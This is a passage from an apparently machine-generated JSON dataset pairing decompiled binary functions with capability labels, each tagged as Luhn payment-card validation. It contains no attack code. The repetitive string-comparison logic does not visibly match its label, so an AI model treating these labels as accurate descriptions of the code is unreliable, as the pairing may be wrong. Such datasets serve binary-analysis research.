uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288b8, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdb8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdb8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd9c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd9c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd80 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd80 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd64 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd64 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd48 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd48 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd2c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd2c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd2c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 5200
    },
    "004bffe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004bffe0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52886c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52888c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288ac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288b8, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdb8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdb8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd9c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd9c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd80 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd80 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd64 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd64 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd48 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd48 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 5010
    },
    "004c0040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0040(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52888c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288ac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288b8, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = 